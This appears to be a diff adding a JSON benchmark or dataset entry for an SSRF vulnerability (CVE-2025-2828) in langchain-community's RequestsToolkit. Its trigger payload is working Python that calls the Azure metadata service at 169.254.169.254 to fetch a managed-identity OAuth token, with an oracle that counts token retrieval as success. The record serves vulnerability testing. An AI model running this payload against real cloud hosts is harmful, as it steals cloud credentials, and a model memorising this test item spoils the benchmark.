@@ -1,0 +1,15 @@
+{
+  "file_id": "140_langchain-community_huntr_8f771040-7f34-420a-b96b-5b93d4a99afc",
+  "numeric_id": "140",
+  "library_hint": "langchain-community",
+  "source": "huntr",
+  "title": "Server-Side Request Forgery (SSRF) in RequestsToolkit due to lack of address restrictions",
+  "cve": "CVE-2025-2828",
+  "cwe": "CWE-918: Server-Side Request Forgery (SSRF)",
+  "library": "langchain-community",
+  "affected_version": "== 0.0.27",
+  "vulnerable_function": "requests_wrapper.get",
+  "triggerability": "indirect",
+  "trigger_payload": "from langchain_community.utilities.requests import TextRequestsWrapper\nfrom langchain_community.agent_toolkits.openapi.toolkit import RequestsToolkit\nimds_endpoint = \"http://169.254.169.254/metadata/identity/oauth2/token\"\napi_version = \"2018-02-01\"\nresource = \"https://managment.azure.com\"\nurl = f\"{imds_endpoint}?api_version={api_version}&resource={resource}\"\nheaders = {'Metadata': 'true'}\nrequests_wrapper = TextRequestsWrapper(headers=headers)\nrequests_toolkit = RequestsToolkit(requests_wrapper=requests_wrapper)\nresponse = requests_toolkit.requests_wrapper.get(url)\nprint (response)",
+  "oracle": "The request successfully retrieves the Azure IMDS token, proving the SSRF vulnerability was triggered."
+}
